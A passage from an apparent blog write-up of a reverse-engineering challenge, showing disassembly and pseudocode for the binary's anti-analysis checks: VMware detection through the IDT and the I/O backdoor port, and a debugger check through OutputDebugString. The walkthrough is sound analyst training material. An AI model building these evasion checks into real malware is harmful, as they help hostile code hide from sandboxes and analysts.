&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401147&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;and&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0FF000000h&lt;/span&gt;              &lt;span style=&#34;color: #586E75&#34;&gt;; Getting the first byte of address&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040114&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040114&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0FF000000h&lt;/span&gt;              &lt;span style=&#34;color: #586E75&#34;&gt;; Comparing the first byte with 0xFF&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401153&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jnz&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_40119A&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;The above compares the first byte of IDT address with &lt;code&gt;0xFF&lt;/code&gt;. According to our table it is looking for &lt;code&gt;VMware&lt;/code&gt;. But we are not running it. If this check passes (meaning we are not running VMware) the string &lt;code&gt;you&#39;re so bad&lt;/code&gt; is going to be xor-ed with the blob, otherwise it will be &lt;code&gt;you&#39;re so good&lt;/code&gt;. The address &lt;code&gt;0xBAB3C590&lt;/code&gt; did not change during my runs in one VM. I will have to try with a different VM in VirtualBox to see if it changes or if it has a pattern. If you know please let me know.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;VMware Detection via Red Pill&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(running_in_vmware):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;you&amp;#39;re so good&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;you&amp;#39;re so bad&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-4-vmware-detection-2-electric-boogaloo:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 4 - VMware Detection 2: Electric Boogaloo&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;isDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B18&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BeingDebugged&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B1D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;VMware_detection&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B22&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4011D0&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B27&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4012A0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401350&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4013F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B36&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401460&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4014F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401590&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4016F0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;What&amp;rsquo;s in the box?&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-8.jpg&#34; alt=&#34;VMware detection 2&#34; title=&#34;VMware detection 2&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Function will create its own exception handler, it will return the execution to &lt;code&gt;loc_401232&lt;/code&gt; if an exception occurs. Then we have some interesting instructions. If we look at the &lt;a href=&#34;https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/&#34; target=&#34;_blank&#34;&gt;Malware Bytes&lt;/a&gt; article, it is named &lt;code&gt;VMware I/O port&lt;/code&gt;. These are the magic instructions:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;VMware I/O port check&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040120&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;564D5868h&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; save magic number to eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401213&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0Ah&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401218&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;dx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5658h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040121&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;in&lt;/span&gt;      &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;dx&lt;/span&gt;          &lt;span style=&#34;color: #586E75&#34;&gt;; if in VMware, this instruction will save the magic number in ebx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040121&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_1C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;    &lt;span style=&#34;color: #586E75&#34;&gt;; executes if in VMware otherwise exception&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s a quick way to find if the application is running in a VMware VM. If &lt;code&gt;in eax, dx&lt;/code&gt; is successful, it will save the magic number in &lt;code&gt;ebx&lt;/code&gt; and then &lt;code&gt;var_1C&lt;/code&gt;. If not, it will raise an exception. But the function has an exception handler and execution will be transferred back to the function. Then &lt;code&gt;var_1C&lt;/code&gt; is compared to the magic number to determine if the application is in a VMware VM or not.&lt;/p&gt;

&lt;p&gt;I was running the application in VirtualBox. Apparently Fireeye thinks we are all rich and use VMware ;) So the check failed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-9.jpg&#34; alt=&#34;VMware detection 2 continued&#34; title=&#34; VMware detection 2 continued&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The rest of the function is pretty simple, if the check fails &lt;code&gt;0x66&lt;/code&gt; (character &lt;code&gt;f&lt;/code&gt;) will be xor-ed with the blob. If running in VMware &lt;code&gt;0x01&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;VMWare Detection 2&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(running_in_vmware):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x01&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-5-outputdebugstring:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 5 - OutputDebugString&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;isDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B18&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BeingDebugged&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B1D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;VMware_detection&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B22&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;Electric_Boogaloo&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B27&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4012A0&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401350&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B31&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4013F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B36&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401460&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B3D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4014F0&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B42&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_401590&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B47&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;sub_4016F0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-10.jpg&#34; alt=&#34;OutputDebugString&#34; title=&#34;OutputDebugString&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This is almost the same as listing 16-1 in page 353 of &lt;code&gt;Practical Malware Analysis&lt;/code&gt; book (&lt;a href=&#34;http://books.google.com/books?id=FQC8EPYy834C&amp;amp;pg=PA353&amp;amp;dq=outputdebugstring&amp;amp;hl=en&amp;amp;sa=X&amp;amp;ei=lcksVI7JM9bGsQSdpoGACA&amp;amp;ved=0CDsQ6AEwBQ#v=onepage&amp;amp;q=outputdebugstring&amp;amp;f=false&#34; target=&#34;_blank&#34;&gt;Link to p.353 on Google Books&lt;/a&gt;). First the current error code is set to &lt;code&gt;0x1234&lt;/code&gt;. Then &lt;code&gt;OutputDebugString&lt;/code&gt; is called with string &lt;code&gt;bah!&lt;/code&gt;. An error occurs if a debugger is not attached to the application and current error code changes, otherwise there is no error and last error code remains &lt;code&gt;0x1234&lt;/code&gt;. Later, last error code is retrieved by calling &lt;code&gt;GetLastError&lt;/code&gt;, if this value is not changed then a debugger is attached to the application and string &lt;code&gt;Sandboxes are fun to play in&lt;/code&gt; is xor-ed with blob. In the absence of a debugger, &lt;code&gt;I&#39;m gonna sandbox your face&lt;/code&gt; is used.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;OutputDebugString&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;debugger_is_attached&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #268BD2&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;bl&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ob&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Sandboxes are fun to play in&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;else:&lt;/span&gt;
    &lt;span style=&#34;color: #268BD2&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;bl&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ob&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;I&amp;#39;m gonna sandbox your face&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h4 id=&#34;function-6-i-can-haz-breakpoint:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Function 6 - I Can Haz Breakpoint?&lt;/h4&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B13&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;isDebuggerPresent&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B18&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;BeingDebugged&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B1D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;VMware_detection&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B22&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;Electric_Boogaloo&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B27&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;OutputDebugString&lt;/span&gt;
